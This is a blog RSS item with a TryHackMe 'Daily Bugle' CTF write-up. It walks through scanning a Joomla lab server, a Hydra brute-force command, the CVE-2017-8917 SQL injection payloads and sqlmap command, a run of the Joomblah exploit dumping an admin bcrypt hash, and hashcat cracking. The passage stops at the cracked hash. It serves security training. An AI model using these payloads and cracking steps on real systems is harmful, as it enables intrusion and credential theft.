<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on tzero86.bits</title>
        <link>https://tzero86-bits.netlify.app/posts/</link>
        <description>Recent content in Posts on tzero86.bits</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Fri, 28 Aug 2020 22:07:08 -0400</lastBuildDate>
        <atom:link href="https://tzero86-bits.netlify.app/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>DailyBugle_writeup.sh</title>
            <link>https://tzero86-bits.netlify.app/posts/dailybugle_writeup/</link>
            <pubDate>Fri, 28 Aug 2020 22:07:08 -0400</pubDate>
            
            <guid>https://tzero86-bits.netlify.app/posts/dailybugle_writeup/</guid>
            <description>Daily Bugle - THM Room This is a writeup or another one of my noob friendly(I hope) post-thingy for Daily Bugle TryhackMe&amp;rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. Yup, I also write down my failed attempts to better illustrate my derailed train of thought.
You have been warned :)
Enjoy!
 Please visit This room on TryHackMe by clicking this link.</description>
            <content type="html"><![CDATA[<h1 id="daily-bugle---thm-room">Daily Bugle - THM Room</h1>
<p>This is a writeup or another one of my noob friendly(I hope) post-thingy for Daily Bugle TryhackMe&rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. Yup, I also write down my failed attempts to better illustrate my derailed train of thought.</p>
<p>You have been warned :)</p>
<p>Enjoy!</p>
<ul>
<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/dailybugle">clicking this link</a>.</li>
<li><strong>PLEASE NOTE:</strong> Passwords and flag values were intentionally redacted as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</li>
</ul>
<h2 id="task-1-deploy">[TASK 1] Deploy</h2>
<blockquote>
<p>Question #1: Access the web server, who robbed the bank?</p>
</blockquote>
<p>Let&rsquo;s start as usual by running an nmap scan:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/dailyBugle<span style="color:#f92672">]</span>
└─$ nmap -A -T4 10.10.179.65 
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-27 12:40 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.179.65
Host is up <span style="color:#f92672">(</span>0.37s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">997</span> closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp   open  http    Apache httpd 2.4.6 <span style="color:#f92672">((</span>CentOS<span style="color:#f92672">)</span> PHP/5.6.40<span style="color:#f92672">)</span>
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: <span style="color:#ae81ff">15</span> disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span> PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB <span style="color:#f92672">(</span>unauthorized<span style="color:#f92672">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 36.17 seconds

</code></pre></div><p>Let&rsquo;s see whats being served on port 80:</p>
<p><img src="https://i.imgur.com/C4X3R75.png" alt="Daily Bugle Home page"></p>
<p>The information on this page gives us the answer to the first question.</p>
<h2 id="task-2-obtain-user-and-root">[Task 2] Obtain user and root</h2>
<blockquote>
<p>Question #1 What is the Joomla Version?</p>
</blockquote>
<p>There is no visible information on the page that reveals the version. We can look into the source code, but before we do that. Let&rsquo;s capture with Burp a login request and put Hydra to work on trying to brute force access for us:</p>
<p>This is the request as captured in Burp:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">POST /index.php/component/users/?task<span style="color:#f92672">=</span>user.login&amp;Itemid<span style="color:#f92672">=</span><span style="color:#ae81ff">101</span> HTTP/1.1
Host: 10.10.179.65
Content-Length: <span style="color:#ae81ff">169</span>
Cache-Control: max-age<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
Origin: http://10.10.179.65
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 10.0; Win64; x64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/84.0.4147.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/webp,image/apng,*/*;q<span style="color:#f92672">=</span>0.8,application/signed-exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span>0.9
Referer: http://10.10.179.65/index.php/component/users/?view<span style="color:#f92672">=</span>login&amp;Itemid<span style="color:#f92672">=</span><span style="color:#ae81ff">101</span>
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.9
Cookie: eaa83fe8b963ab08ce9ab7d4a798de05<span style="color:#f92672">=</span>egb2jrelr81kl1mi493gfkf544; 2b01af51830ca9615359108de04d9ca1<span style="color:#f92672">=</span>ulpsk0o9dmfa0ms8ebohvbs0n5
Connection: close

username<span style="color:#f92672">=</span>spiderman&amp;password<span style="color:#f92672">=</span>test&amp;<span style="color:#66d9ef">return</span><span style="color:#f92672">=</span>aHR0cDovLzEwLjEwLjE3OS42NS9pbmRleC5waHAvY29tcG9uZW50L3VzZXJzLz92aWV3PWxvZ2luJkl0ZW1pZD0xMDE%3D&amp;0ba84fa157b8f604f997575d184e2636<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</code></pre></div><p>With this info let&rsquo;s put together an hydra attack:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/dailyBugle<span style="color:#f92672">]</span>
└─$ hydra -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/rockyou.txt 10.10.179.65 http-post-form <span style="color:#e6db74">&#34;/index.php/component/users/?task=user.login&amp;Itemid=101:username=^USER^&amp;password=^PASS^&amp;Submit=&amp;option=com_users&amp;task=user.login&amp;return=aHR0cDovLzEwLjEwLjE3OS42NS9pbmRleC5waHAvMi11bmNhdGVnb3Jpc2VkLzEtc3BpZGVyLW1hbi1yb2JzLWJhbms%3D&amp;9b46f637d905f7985fcefd95b0e502de=1:F=Username and password do not match or you do not have an account yet.&#34;</span> -V 
Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.

Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2020-08-27 12:59:33
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">11862817973</span> login tries <span style="color:#f92672">(</span>l:827/p:14344399<span style="color:#f92672">)</span>, ~741426124 tries per task
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://10.10.207.42:80/index.php:username<span style="color:#f92672">=</span>^USER^&amp;password<span style="color:#f92672">=</span>^PASS^&amp;Submit<span style="color:#f92672">=</span>&amp;option<span style="color:#f92672">=</span>com_users&amp;task<span style="color:#f92672">=</span>user.login&amp;<span style="color:#66d9ef">return</span><span style="color:#f92672">=</span>aHR0cDovLzEwLjEwLjE3OS42NS9pbmRleC5waHAvMi11bmNhdGVnb3Jpc2VkLzEtc3BpZGVyLW1hbi1yb2JzLWJhbms%3D&amp;9b46f637d905f7985fcefd95b0e502de<span style="color:#f92672">=</span>1:F<span style="color:#f92672">=</span>Username and password <span style="color:#66d9ef">do</span> not match or you <span style="color:#66d9ef">do</span> not have an account yet.
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;!root&#34;</span> - pass <span style="color:#e6db74">&#34;123456&#34;</span> - <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">11862817973</span> <span style="color:#f92672">[</span>child 0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;!root&#34;</span> - pass <span style="color:#e6db74">&#34;12345&#34;</span> - <span style="color:#ae81ff">2</span> of <span style="color:#ae81ff">11862817973</span> <span style="color:#f92672">[</span>child 1<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;!root&#34;</span> - pass <span style="color:#e6db74">&#34;123456789&#34;</span> - <span style="color:#ae81ff">3</span> of <span style="color:#ae81ff">11862817973</span> <span style="color:#f92672">[</span>child 2<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>

</code></pre></div><p>That attack will take a while, let&rsquo;s check the source code of the site to see if it reaveals the version somewhere.
Spoiler alert! The source code revealed nothing. However, we still now it is running Joomla.</p>
<p>Let&rsquo;s fire up a <strong>joomscan</strong> scan:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">    ____  _____  _____  __  __  ___   ___    __    _  _ 
   <span style="color:#f92672">(</span>_  _<span style="color:#f92672">)(</span>  _  <span style="color:#f92672">)(</span>  _  <span style="color:#f92672">)(</span>  <span style="color:#ae81ff">\/</span>  <span style="color:#f92672">)</span>/ __<span style="color:#f92672">)</span> / __<span style="color:#f92672">)</span>  /__<span style="color:#ae81ff">\ </span> <span style="color:#f92672">(</span> <span style="color:#ae81ff">\(</span> <span style="color:#f92672">)</span>
  .-_<span style="color:#f92672">)(</span>   <span style="color:#f92672">)(</span>_<span style="color:#f92672">)(</span>  <span style="color:#f92672">)(</span>_<span style="color:#f92672">)(</span>  <span style="color:#f92672">)</span>    <span style="color:#f92672">(</span> <span style="color:#ae81ff">\_</span>_ <span style="color:#ae81ff">\(</span> <span style="color:#f92672">(</span>__  /<span style="color:#f92672">(</span>__<span style="color:#f92672">)</span><span style="color:#ae81ff">\ </span> <span style="color:#f92672">)</span>  <span style="color:#f92672">(</span> 
  <span style="color:#ae81ff">\_</span>___<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>_____<span style="color:#f92672">)(</span>_____<span style="color:#f92672">)(</span>_/<span style="color:#ae81ff">\/\_</span><span style="color:#f92672">)(</span>___/ <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>__<span style="color:#f92672">)(</span>__<span style="color:#f92672">)(</span>_<span style="color:#f92672">)</span><span style="color:#ae81ff">\_</span><span style="color:#f92672">)</span>
                        <span style="color:#f92672">(</span>1337.today<span style="color:#f92672">)</span>
   
    --<span style="color:#f92672">=[</span>OWASP JoomScan
    +---++---<span style="color:#f92672">==[</span>Version : 0.0.7
    +---++---<span style="color:#f92672">==[</span>Update Date : <span style="color:#f92672">[</span>2018/09/23<span style="color:#f92672">]</span>
    +---++---<span style="color:#f92672">==[</span>Authors : Mohammad Reza Espargham , Ali Razmjoo
    --<span style="color:#f92672">=[</span>Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.179.65 ...

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> FireWall Detector
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Firewall not detected
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Detecting Joomla Version
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Joomla <span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>                              
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Core Joomla Vulnerability              
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Target Joomla core is not vulnerable                                                                                                                                                                         
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Checking Directory Listing       
http://10.10.179.65/administrator/components
http://10.10.179.65/administrator/modules
http://10.10.179.65/administrator/templates
http://10.10.179.65/images/banners   
                                                                                                                                                       
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Checking apache info/status files
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Readable info/status files are not found
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> admin finder                    
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Admin page: http://10.10.179.65/administrator/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Checking robots.txt existing      
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> robots.txt is found           
path : http://10.10.179.65/robots.txt
                                                                                                                                                                                     
Interesting path found from robots.txt
http://10.10.179.65/joomla/administrator/   
http://10.10.179.65/administrator/          
http://10.10.179.65/bin/          
http://10.10.179.65/cache/          
http://10.10.179.65/cli/          
http://10.10.179.65/components/          
http://10.10.179.65/includes/          
http://10.10.179.65/installation/          
http://10.10.179.65/language/          
http://10.10.179.65/layouts/          
http://10.10.179.65/libraries/          
http://10.10.179.65/logs/          
http://10.10.179.65/modules/          
http://10.10.179.65/plugins/          
http://10.10.179.65/tmp/          
                              
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finding common backup files name
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Backup files are not found    
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finding common log files name 
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> error log is not found        
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Checking sensitive config.php.x file
<span style="color:#f92672">[</span>++<span style="color:#f92672">]</span> Readable config files are not found

Your Report : reports/10.10.179.65/         
</code></pre></div><p>And with that we get the Joomla version. Also it is worth mentionning that the <strong>hydra</strong> attack attempt did not work:</p>
<pre><code>- Me: maybe I did something wrong?
- The voice in my head: Most likely.
</code></pre>
<h2 id="task-2-question-2-what-is-jonahs-cracked-password">[Task 2] Question #2: What is Jonah&rsquo;s cracked password?</h2>
<p>If we search for joomla exploits for the version we found, we see there is a couple available:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
└─$ searchsploit joomla <span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                         |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! <span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>- <span style="color:#e6db74">&#39;com_fields&#39;</span> SQL Injection                                                         | php/webapps/<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>.txt
Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripting                                          | php/webapps/43488.txt
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre></div><p>The first one seems to be exactly for the version we have. Let&rsquo;s open it up to see what it is about:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Exploit Title: Joomla 3.7.0 - Sql Injection</span>
<span style="color:#75715e"># Date: 05-19-2017</span>
<span style="color:#75715e"># Exploit Author: Mateus Lino</span>
<span style="color:#75715e"># Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</span>
<span style="color:#75715e"># Vendor Homepage: https://www.joomla.org/</span>
<span style="color:#75715e"># Version: = 3.7.0</span>
<span style="color:#75715e"># Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span>
<span style="color:#75715e"># CVE : - CVE-2017-8917</span>


URL Vulnerable: http://localhost/index.php?option<span style="color:#f92672">=</span>com_fields&amp;view<span style="color:#f92672">=</span>fields&amp;layout<span style="color:#f92672">=</span>modal&amp;list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]=</span>updatexml%27


Using Sqlmap: 

sqlmap -u <span style="color:#e6db74">&#34;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent --dbs -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>


Parameter: list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>GET<span style="color:#f92672">)</span>
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace <span style="color:#f92672">(</span>DUAL<span style="color:#f92672">)</span>
    Payload: option<span style="color:#f92672">=</span>com_fields&amp;view<span style="color:#f92672">=</span>fields&amp;layout<span style="color:#f92672">=</span>modal&amp;list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]=(</span>CASE WHEN <span style="color:#f92672">(</span>1573<span style="color:#f92672">=</span>1573<span style="color:#f92672">)</span> THEN <span style="color:#ae81ff">1573</span> ELSE 1573*<span style="color:#f92672">(</span>SELECT <span style="color:#ae81ff">1573</span> FROM DUAL UNION SELECT <span style="color:#ae81ff">9674</span> FROM DUAL<span style="color:#f92672">)</span> END<span style="color:#f92672">)</span>

    Type: error-based
    Title: MySQL &gt;<span style="color:#f92672">=</span> 5.0 error-based - Parameter replace <span style="color:#f92672">(</span>FLOOR<span style="color:#f92672">)</span>
    Payload: option<span style="color:#f92672">=</span>com_fields&amp;view<span style="color:#f92672">=</span>fields&amp;layout<span style="color:#f92672">=</span>modal&amp;list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]=(</span>SELECT <span style="color:#ae81ff">6600</span> FROM<span style="color:#f92672">(</span>SELECT COUNT<span style="color:#f92672">(</span>*<span style="color:#f92672">)</span>,CONCAT<span style="color:#f92672">(</span>0x7171767071,<span style="color:#f92672">(</span>SELECT <span style="color:#f92672">(</span>ELT<span style="color:#f92672">(</span>6600<span style="color:#f92672">=</span>6600,1<span style="color:#f92672">)))</span>,0x716a707671,FLOOR<span style="color:#f92672">(</span>RAND<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>*2<span style="color:#f92672">))</span>x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x<span style="color:#f92672">)</span>a<span style="color:#f92672">)</span>

    Type: AND/OR time-based blind
    Title: MySQL &gt;<span style="color:#f92672">=</span> 5.0.12 time-based blind - Parameter replace <span style="color:#f92672">(</span>substraction<span style="color:#f92672">)</span>
    Payload: option<span style="color:#f92672">=</span>com_fields&amp;view<span style="color:#f92672">=</span>fields&amp;layout<span style="color:#f92672">=</span>modal&amp;list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]=(</span>SELECT * FROM <span style="color:#f92672">(</span>SELECT<span style="color:#f92672">(</span>SLEEP<span style="color:#f92672">(</span>5<span style="color:#f92672">)))</span>GDiu<span style="color:#f92672">)</span>

</code></pre></div><p>It seems we can exploit this version by using a SQLMap commnad. However, while searching for the CVE Number related to this vulnerability we see there is a python script available. Which could be what the room suggests instead of goind the SQLi way. Let&rsquo;s look at that first.</p>
<ul>
<li>Download the Script: From <a href="https://github.com/XiphosResearch/exploits/tree/master/Joomblah">this link</a>.</li>
</ul>
<p>Please be aware that in order for this script to work I had to install the following first:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sudo apt install python-pip -y
pip install requests
</code></pre></div><p>Then I was able to execute the script, it was quite fast and just required the URL:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/dailyBugle<span style="color:#f92672">]</span>
└─$ python joomblah.py http://10.10.61.166:80
                                                                                                                                                                                                                            
    .---.    .-<span style="color:#e6db74">&#39;&#39;&#39;-.        .-&#39;&#39;&#39;</span>-.                                                           
    |   |   <span style="color:#e6db74">&#39;   _    \     &#39;</span>   _    <span style="color:#ae81ff">\ </span>                           .---.                        
    <span style="color:#e6db74">&#39;---&#39;</span> /   /<span style="color:#e6db74">`</span> <span style="color:#e6db74">&#39;.   \  /   /` &#39;</span>.   <span style="color:#ae81ff">\ </span> __  __   ___   /|        |   |            .           
    .---..   |     <span style="color:#ae81ff">\ </span> <span style="color:#e6db74">&#39; .   |     \  &#39;</span> |  |/  <span style="color:#e6db74">`</span>.<span style="color:#e6db74">&#39;   `. ||        |   |          .&#39;</span>|           
    |   <span style="color:#f92672">||</span>   <span style="color:#e6db74">&#39;      |  &#39;</span>|   <span style="color:#e6db74">&#39;      |  &#39;</span>|   .-.  .-.   <span style="color:#e6db74">&#39;||        |   |         &lt;  |           
</span><span style="color:#e6db74">    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
</span><span style="color:#e6db74">    |   | `.   ` ..&#39;</span> /   <span style="color:#e6db74">`</span>.   <span style="color:#e6db74">`</span> ..<span style="color:#e6db74">&#39; /  |  |  |  |  |  |||/&#39;</span>__ <span style="color:#e6db74">&#39;. |   | .:--.&#39;</span>.  | | .<span style="color:#e6db74">&#39;&#39;&#39;-.    
</span><span style="color:#e6db74">    |   |    &#39;</span>-...-<span style="color:#e6db74">&#39;`       &#39;</span>-...-<span style="color:#e6db74">&#39;`   |  |  |  |  |  ||:/`  &#39;</span>. <span style="color:#e6db74">&#39;|   |/ |   \ | | |/.&#39;&#39;&#39;</span>. <span style="color:#ae81ff">\ </span>  
    |   |                              |  |  |  |  |  <span style="color:#f92672">||</span>|     | <span style="color:#f92672">||</span>   |<span style="color:#e6db74">`</span><span style="color:#e6db74">&#34; __ | | |  /    | |   
</span><span style="color:#e6db74">    |   |                              |__|  |__|  |__|||\    / &#39;|   | .&#39;.&#39;&#39;| | | |     | |   
</span><span style="color:#e6db74"> __.&#39;   &#39;                                              |/&#39;..&#39; / &#39;---&#39;/ /   | |_| |     | |   
</span><span style="color:#e6db74">|      &#39;                                               &#39;  `&#39;-&#39;`       \ \._,\ &#39;/| &#39;.    | &#39;.  
</span><span style="color:#e6db74">|____.&#39;                                                                `--&#39;  `&#34;</span> <span style="color:#e6db74">&#39;---&#39;</span>   <span style="color:#e6db74">&#39;---&#39;</span> 

 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching CSRF token
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 <span style="color:#f92672">[</span>$<span style="color:#f92672">]</span> Found user <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;811&#39;</span>, <span style="color:#e6db74">&#39;Super User&#39;</span>, <span style="color:#e6db74">&#39;jonah&#39;</span>, <span style="color:#e6db74">&#39;jonah@tryhackme.com&#39;</span>, <span style="color:#e6db74">&#39;$2y$10$0veO/{REDACTED}VMw.V.d3p12kBtZutm&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">]</span>
  -  Extracting sessions from fb9j5_session

</code></pre></div><p>The script gives us the password hash, let&rsquo;s use <strong>hashcat</strong> to try and crack it. Save the extracted hash to a file and then let&rsquo;s try to detect which hash type we are dealing with:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/dailyBugle<span style="color:#f92672">]</span>
└─$ hashid <span style="color:#e6db74">&#39;$2y$10$0veO/{REDACTED}jVMw.V.d3p12kBtZutm&#39;</span>         
Analyzing <span style="color:#e6db74">&#39;$2y$10$0veO/{REDACTED}VMw.V.d3p12kBtZutm&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Blowfish<span style="color:#f92672">(</span>OpenBSD<span style="color:#f92672">)</span> 
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Woltlab Burning Board 4.x 
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> bcrypt 

</code></pre></div><p>Now let&rsquo;s try to crack it with hashcat, this might take a <strong>while</strong> depending your system, seriously. But eventually we&rsquo;ll get it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/dailyBugle<span style="color:#f92672">]</span>
└─$ hashcat -m3200 -a0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat <span style="color:#f92672">(</span>v6.1.1<span style="color:#f92672">)</span> starting...

OpenCL API <span style="color:#f92672">(</span>OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG<span style="color:#f92672">)</span> - Platform <span style="color:#75715e">#1 [The pocl project]</span>
<span style="color:#f92672">=============================================================================================================================</span>
* Device <span style="color:#75715e">#1: pthread-AMD Ryzen 7 3800X 8-Core Processor, 10871/10935 MB (4096 MB allocatable), 6MCU</span>

Minimum password length supported by kernel: <span style="color:#ae81ff">0</span>
Maximum password length supported by kernel: <span style="color:#ae81ff">72</span>

Hashes: <span style="color:#ae81ff">1</span> digests; <span style="color:#ae81ff">1</span> unique digests, <span style="color:#ae81ff">1</span> unique salts
Bitmaps: <span style="color:#ae81ff">16</span> bits, <span style="color:#ae81ff">65536</span> entries, 0x0000ffff mask, <span style="color:#ae81ff">262144</span> bytes, 5/13 rotates
Rules: <span style="color:#ae81ff">1</span>

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">65</span> MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: <span style="color:#ae81ff">14344392</span>
* Bytes.....: <span style="color:#ae81ff">139921507</span>
* Keyspace..: <span style="color:#ae81ff">14344385</span>
* Runtime...: <span style="color:#ae81ff">1</span> sec

<span style="color:#f92672">[</span>s<span style="color:#f92672">]</span>tatus <span style="color:#f92672">[</span>p<span style="color:#f92672">]</span>ause <span style="color:#f92672">[</span>b<span style="color:#f92672">]</span>ypass <span style="color:#f92672">[</span>c<span style="color:#f92672">]</span>heckpoint <span style="color:#f92672">[</span>q<span style="color:#f92672">]</span>uit <span style="color:#f92672">=</span>&gt; s


$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish <span style="color:#f92672">(</span>Unix<span style="color:#f92672">)</span>
Hash.Target......: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p...BtZutm
